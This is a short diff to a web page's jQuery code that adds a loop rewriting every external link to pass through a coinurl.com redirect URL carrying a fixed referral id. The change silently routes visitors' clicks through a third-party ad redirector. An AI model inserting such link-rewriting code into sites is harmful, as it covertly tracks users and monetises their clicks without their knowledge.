@@ -85,3 +85,7 @@ body
           $(el).find("i").attr('class', 'icon-spinner icon-spin');
         });
       });
+
+      $("a[href^=http]").each(function (e, lnk) {
+        $(lnk).attr('href', 'http://coinurl.com/redirect.php?id=792b94f1e3cbe74e1465f07549db9a3a&url=' + encodeURIComponent($(lnk).attr('href')));
+      });
